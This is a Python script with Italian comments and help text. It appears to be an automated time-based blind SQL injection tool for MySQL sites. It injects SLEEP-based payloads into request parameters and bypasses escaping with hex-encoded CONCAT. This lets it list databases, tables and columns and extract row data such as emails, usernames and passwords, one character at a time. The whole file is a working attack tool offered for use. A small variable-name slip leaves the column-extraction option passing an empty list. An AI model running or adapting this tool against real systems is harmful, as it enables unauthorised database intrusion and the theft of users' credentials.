#!/usr/bin/env python

import requests, timeit, string, sys, getopt

headers = {
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	'Content-Type': 'application/x-www-form-urlencoded'
}

params = {}

alphabeth = list(string.ascii_lowercase) + list(string.digits) + list('_.+-@:')

def main(pName, argv):
	url = ''
	data = {}
	database = ''
	table = 'users'
	method = 'get'
	query = ''
	opts = []
	args = []
	columns_list = []
	isDBSearch = False
	isTableInspection = False
	isTableSearch = False
	isDataExtraction = False
	isMuted = False

	try:
		opts, args = getopt.getopt(argv,'hu:d:b:t:c:m',['help','url=','data=',"databases", "database=", "tables", "table=", "columns", "column-list=", "mute"])
	except getopt.GetoptError:
		help(pName,2)

	for opt, arg in opts:
		if opt == '-h' or opt == '-help':
			help(pName)
		elif opt == '-u' or opt == '--url':
			url = arg;
		elif opt == '-d' or opt == '--data':
			query = arg
			method = 'post'
		elif opt == '--databases':
			isDBSearch = True
		elif opt == '-b' or opt == '--database':
			database = arg
		elif opt == '--tables':
			isTableSearch = True
		elif opt == '-t' or opt == '--table':
			table = arg
		elif opt == '--columns':
			isTableInspection = True
		elif opt == '-c' or opt == '--column-list':
			column_list = arg.split(',')
			isDataExtraction = True
		elif opt == '-m' or opt == '--mute':
			isMuted = True
		else:
			help(pName,3)

	if check(url):
		if not query:
			split = url.split('?')
			if len(split) == 2:
				url = split[0]
				data = split_request_params(split[1])
			else:
				print('Non è stato passato nessun parametro per effettuare la richiesta')
				print('per favore fornire i parametri della query tramite il parametro data')
				print('e indicare il metodo http usato se necessario')
				print('per default si assumerà di effettuare una richiesta get')
				sys.exit(4)
		else:
			data = split_request_params(query)

	if isDBSearch:
		retrieve_databases(url, data, method, isMuted)
	elif isTableSearch:
		retrieve_tables(url, data, method, database, isMuted)
	elif isTableInspection:
		table_inspection(url, data, method, database, table, isMuted)
	elif isDataExtraction:
		retrieve_data(url, data, method, database, table, column_list, isMuted)
	else:
		help(pName,7)

def split_request_params(params = ''):
	data = {}

	split = params.split('&')
	for s in split:
		ss = s.split('=')
		data[ss[0]] = ss[1]

	return data

def help(pName, errorCode=0):
	print(pName + ' -u <url> [opzioni]')
	print('\tOPZIONI')
	print('\t-h | --help\t\t\t\tVisualizza questo messaggio di aiuto')
	print('')
	print('\t-u <url> | --url=<url>\t\t\tImposta la URL della pagina vulnerabile')
	print('')
	print('\t-d | --data\t\t\t\tStringa che rappresenta la richiesta in formato url encoded')
	print('\t\t\t\t\t\tin cui i parametri sono composti da nomevariabile=tipovariabile')
	print('\t\t\t\t\t\tdove nomevariabile è il nome del parametro della richiesta ')
	print('\t\t\t\t\t\tdove tipovariabile è il tipo del parametro della richiesta ')
	print('\t\t\t\t\t\tche può essere \'string\' oppure \'number\'')
	print('\t\t\t\t\t\tper esempio email=string&id=number.')
	print('\t\t\t\t\t\tSe settato il parametro data, la richiesta verrà effettuata in post')
	print('')
	print('\t--databases\t\t\t\tEstrae la lista dei databases')
	print('')
	print('\t-b <dbname> | --database=<dbname>\tImposta il nome database per la successiva istruzione')
	print('')
	print('\t--tables\t\t\t\tEstrae la lista delle tabelle dal database indicato')
	print('')
	print('\t-t <tablename> | --table=<tablename>\tImposta il nome della tabella per la successiva istruzione')
	print('')
	print('\t--columns\t\t\t\tEstrae la lista delle colonne dalla tabella indicata')
	print('')
	print('\t-c <list> | --column-list=<list>\tIndica una lista di nomi colonna di cui estrarre i valori')
	print('\t\t\t\t\t\tseparati da virgole. Per Esempio: email,username,password')
	print('')
	print('\t-m | --mute\tBlocca il print dei dati recuperati al termine dell\'esecuzione')
	sys.exit(errorCode)


def check(url):
	return len(url) > 0

# Esegue la richiesta
def exec_request(url, headers, params, method):

	start = timeit.default_timer()
	if method == 'get':
		response = requests.get(url, headers=headers, params=params)
	elif method == 'post':
		response = requests.post(url, headers=headers, data=params)
	stop = timeit.default_timer()

	return stop - start

# Questa funzione prepara il parametro vulnerabile assegnandogli come valore
# una stringa che wrappa il payload in modo consono a seconda se il valore è
# numerico o una stringa
def prepare_exploitable(params, key, type, payload):

	if type == 'string' or type == 'number':
		if type == 'string':
			params[key] = "' AND (" + payload + ") AND 1=1 -- -"
		elif type == 'number':
			params[key] = "1+IF((" + payload + ") IS NULL, 0, 1)"
	else:
		print('Tipo parametri passati errati. Il tipo può essere \'string\' o \'number\'')
		sys.exit(4)

	return params

# Prepara tutti gli altri parametri indicati con dei valory dummy
def prepare_others(params, data, key):
	for local_key in params:
		if local_key != key:
			if data[local_key] == 'string' or data[local_key] == 'number':
				if data[local_key] == 'string':
					params[local_key] = ''
				elif data[local_key] == 'number':
					params[local_key] = 1
			else:
				print('Tipo parametri passati errati. Il tipo può essere \'string\' o \'number\'')
				sys.exit(5)

	return params

# Esegue injection per il count degli elementi (database, tabelle, righe)
def count(url, headers, params, key, type='string', method = 'get', payload = ''):

	# Conteggio numero elementi del
	for count in range(1,sys.maxsize):

		params = prepare_exploitable(params, key, type, payload.format(count))

		if exec_request(url, headers, params, method) >= 0.1:
			return count

# Esegue l'estrazione dei dati relativi algli elementi richiesti
def exploit(url, headers, params, key, type='string', method = 'get', payload='', n_elements = 1, isMuted = False):
	elements = []

	for i in range(0,n_elements):
		element = []
		count = 0
		found = True
		while found:

			local_found = False
			for a in alphabeth:

				params = prepare_exploitable(params, key, type, payload.format(i, count+1, hex(ord(a))))

				if exec_request(url, headers, params, method) >= 0.1:
					local_found = True
					count+=1
					element.append(a)
					break

			found = local_found

		if element != []:
			elements.append(element)

	# stampo i dati trovati
	if not isMuted and elements != []:
		for e in elements:
			print(''.join(e))
		sys.exit(0)
	else:
		sys.exit(0)

def execute(url, data, method='get', payload_count='', payload_extraction='', isMuted = False):
	elements = []

	params = dict(data)

	# Eseguo l'injection per ogni parametro della richiesta finché non trovo risultati
	for key in data:

		params = prepare_others(params, data, key)

		n_elements = count(url, headers, params, key, data[key], method, payload_count)

		if n_elements == 0:
			print("Nessun database trovato, oppure la pagina non è vulnerabile al timing based SQL injection o ancora il database non è mysql")
		else:
			exploit(url, headers, params, key, data[key], method, payload_extraction, n_elements, isMuted)

# Trasforma una stringa nel suo corrispondente elenco di caratteri in codifica
# esadecimale da passare a CONCAT()
def calulate_hex_list(string):
	list_hex = []
	for l in string:
		list_hex.append(hex(ord(l)))
	return ",".join(list_hex)

# Funzione che recupera i nomi dei database
def retrieve_databases(url, data={}, method='get', isMuted = False):

	#Controllo l'esistenza di tutti i parametri necessari per effettuare l'injection
	if data == {}:
		print('Non è stato passato nessun parametro per effettuare la richiesta')
		print('per favore fornire i parametri della query tramite il parametro data')
		print('e indicare il Funzione http usato se necessario')
		print('per default si assumerà di effettuare una richiesta get')
		sys.exit(4)

	payload_count = "SELECT * FROM (SELECT COUNT(*) AS n_databases FROM information_schema.schemata)x WHERE x.n_databases = {} AND SLEEP(0.1)"

	payload_extraction = "SELECT * FROM(SELECT schema_name FROM information_schema.schemata LIMIT {},1)x WHERE MID(x.schema_name,{},1) = {} AND SLEEP(0.1)"

	execute(url, data, method, payload_count, payload_extraction, isMuted)

# Recupera i nomi delle tabelle per un database dato
def retrieve_tables(url, data={}, method='get', db='', isMuted = False):

	#Controllo l'esistenza di tutti i parametri necessari per effettuare l'injection
	if data == {}:
		print('Non è stato passato nessun parametro per effettuare la richiesta')
		print('per favore fornire i parametri della query tramite il parametro data')
		print('e indicare il Funzione http usato se necessario')
		print('per default si assumerà di effettuare una richiesta get')
		sys.exit(4)

	if db == '':
		print('Non è stato passato il nome del database in cui effettuare la ricerca');
		sys.exit(5)

	# Trasformo la stringa del nome del database in una lista di valori
	# esadecimali separati da virgola per poterla passare alla query di payload
	# in modo che sia safe anche per bypassare il mysql_real_escape_string
	database_hex = calulate_hex_list(db)

	payload_count = "SELECT * FROM (SELECT COUNT(*) AS n_tables FROM information_schema.tables WHERE table_schema = CONCAT(" + database_hex + "))x WHERE x.n_tables = {} AND SLEEP(0.1)"
	payload_extraction = "SELECT * FROM(SELECT table_name FROM information_schema.tables WHERE table_schema = CONCAT(" + database_hex + ") LIMIT {},1)x WHERE MID(x.table_name,{},1) = {} AND SLEEP(0.1)"

	# Eseguo l'injection per ogni parametro della richiesta finché non trovo risultati
	execute(url, data, method, payload_count, payload_extraction, isMuted)

# recupera il nome delle colonne di una tabella data
def table_inspection(url, data={}, method='get', db='', table='', isMuted = False):
	n_columns = 0

	# Eseguo l'injection per ogni parametro della richiesta finché non trovo risultati
	if data == {}:
		print('Non è stato passato nessun parametro per effettuare la richiesta')
		print('per favore fornire i parametri della query tramite il parametro data')
		print('e indicare il Funzione http usato se necessario')
		print('per default si assumerà di effettuare una richiesta get')
		sys.exit(4)

	if db == '':
		print('Non è stato passato il nome del database in cui effettuare la ricerca');
		sys.exit(5)

	if table == '':
		print('Non è stato passato il nome della tabella da inspezionare');
		sys.exit(6)

	# Trasformo la stringa del nome del database in una lista di valori
	# esadecimali separati da virgola per poterla passare alla query di payload
	# in modo che sia safe anche per bypassare il mysql_real_escape_string
	database_hex = calulate_hex_list(db)

	# Faccio lo stesso con il nome della tabella
	table_hex = calulate_hex_list(table)

	payload_count = "SELECT * FROM (SELECT COUNT(*) AS n_columns FROM information_schema.columns WHERE table_schema = CONCAT(" + database_hex + ") AND table_name = CONCAT(" + table_hex + "))x WHERE x.n_columns = {} AND SLEEP(0.1)"
	payload_extraction = "SELECT * FROM(SELECT CONCAT(column_name,"+hex(ord(':'))+",column_type) AS column_info FROM information_schema.columns WHERE table_schema = CONCAT(" + database_hex + ") AND table_name = CONCAT(" + table_hex + ") LIMIT {},1)x WHERE MID(x.column_info,{},1) = {} AND SLEEP(0.1)"

	execute(url, data, method, payload_count, payload_extraction, isMuted)

# Funzione main che recupera i dati contenuti nelle colonne presenti in columns_list
# per una tabella data
def retrieve_data(url, data={}, method='get', db='', table='', columns_list = [], isMuted = False):

	if data == {}:
		print('Non è stato passato nessun parametro per effettuare la richiesta')
		print('per favore fornire i parametri della query tramite il parametro data')
		print('e indicare il Funzione http usato se necessario')
		print('per default si assumerà di effettuare una richiesta get')
		sys.exit(4)

	if db == '':
		print('Non è stato passato il nome del database in cui effettuare la ricerca');
		sys.exit(5)

	if table == '':
		print('Non è stato passato il nome della tabella da inspezionare');
		sys.exit(6)

	if columns_list == []:
		print('Non è stata passata la lista delle colonne da estrarre');
		sys.exit(7)

	columns_concat = (','+hex(ord(':'))+',').join(columns_list)

	payload_count = "SELECT * FROM (SELECT COUNT(*) AS n_rows FROM  " + db + '.' + table + ")x WHERE n_rows = {} AND SLEEP(0.1)"

	payload_extraction = "SELECT * FROM(SELECT CONCAT(" + columns_concat + ") AS data FROM " + db + '.' + table + " LIMIT {},1)x WHERE MID(x.data,{},1) = {} AND SLEEP(0.1)"

	execute(url, data, method, payload_count, payload_extraction, isMuted)

if __name__ == '__main__':
	main(sys.argv[0], sys.argv[1:])
	sys.exit(0)
